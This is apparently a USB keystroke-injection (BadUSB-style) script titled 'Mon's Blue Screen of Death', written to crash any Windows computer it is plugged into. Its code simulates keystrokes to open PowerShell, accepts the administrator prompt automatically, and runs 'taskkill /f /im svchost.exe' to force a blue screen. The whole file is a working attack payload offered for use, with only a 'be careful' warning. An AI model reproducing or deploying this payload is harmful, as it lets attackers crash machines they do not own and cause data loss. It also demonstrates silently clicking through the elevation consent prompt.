//============================ Mon's Blue Screen of Death ================================

// SYNOPSIS
// This script will cause a blue screen on any windows computer.

// WARNING
// This is a dangerous script - Be Careful!

// USB SETTING - STARTUP

layout('us'); 
typingSpeed(1,1);
press("GUI r");
delay(1000);
type("powershell"); //opens powershell
press("control shift enter"); //opens powershell in admin mode
delay(2000);
press("left enter"); //selects 'yes' in the admin prompt.
delay(5000);
type("taskkill /f /im svchost.exe\n"); //instantly kills svchost.exe which causes a bluescreen.